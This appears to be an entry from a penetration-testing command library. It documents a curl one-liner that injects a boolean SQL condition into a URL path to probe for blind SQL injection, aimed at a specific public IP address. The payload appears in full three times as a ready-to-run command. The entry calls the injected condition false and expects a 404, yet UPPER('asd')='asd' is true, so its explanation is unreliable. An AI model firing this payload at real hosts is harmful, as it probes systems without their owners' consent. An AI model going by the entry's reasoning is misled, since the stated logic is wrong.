---
data: 'curl -i "http://51.83.253.82/item/default''and UPPER(''asd'')=''asd''--"'
tags:
  - sqli
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.343Z'
id: 6db249f9-d99b-41dc-a38f-ce183ad1fa79
verified: false
validated: true
submitted: true
---
# curl-sqli-test-false

## Command

```bash
curl -i "http://51.83.253.82/item/default'and UPPER('asd')='asd'--"
```

## Description

Injects a false boolean SQL condition into the URI path to test for blind SQLi, expecting a 404 response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include headers | Yes |
| URL with payload | Injection point | Yes |

## Examples

### Basic Usage

```bash
curl -i "http://51.83.253.82/item/default'and UPPER('asd')='asd'--"
```

## Expected Output

HTTP/1.1 404 Not Found, indicating query failure due to false condition.

## Related

- [[Related Procedure: Test-for-Blind-SQL-Injection-in-URI-Path]]
